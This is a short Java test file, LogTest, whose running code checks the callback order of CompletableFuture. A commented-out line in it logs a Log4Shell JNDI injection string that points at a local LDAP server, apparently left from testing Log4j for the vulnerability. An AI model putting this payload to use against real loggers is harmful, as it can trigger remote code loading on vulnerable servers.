package io.github.wuare.ot;

import java.io.IOException;
import java.util.concurrent.CompletableFuture;

public class LogTest {

    // private static final Logger logger = LogManager.getLogger(LogTest.class);

    public static void main(String[] args) {
        // logger.error("${jndi:ldap://127.0.0.1:1389/a}");
        CompletableFuture<String> f1 = new CompletableFuture<>();
        CompletableFuture<String> f2 = f1.thenApplyAsync(r -> {
            System.out.println("a");
            return "a";
        });
        f1.thenApplyAsync(r -> {
            System.out.println("b");
            return "b";
        });
        f1.thenApplyAsync(r -> {
            System.out.println("c");
            return "c";
        });
        f2.thenApplyAsync(r -> {
            System.out.println("d");
            return "d";
        });
        f1.complete("x");
        System.out.println(0);
        try {
            System.in.read();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
